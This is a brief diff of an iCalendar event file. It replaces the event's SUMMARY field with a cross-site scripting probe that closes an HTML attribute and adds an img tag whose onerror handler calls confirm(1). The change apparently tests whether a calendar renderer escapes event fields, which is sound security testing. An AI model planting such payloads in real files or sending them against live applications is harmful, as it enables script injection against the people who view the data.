@@ -4,7 +4,7 @@ BEGIN:VEVENT
 UID:1656613525081-91990@deep.dpnkr.in
 DTSTART:20240701T090000
 DTEND:20240701T100000
-SUMMARY:Test Event
+SUMMARY:Test Event"><img src=y onerror=confirm(1)>
 DESCRIPTION:This is test event for my blog
 LOCATION:https://dpnkr.in
 END:VEVENT
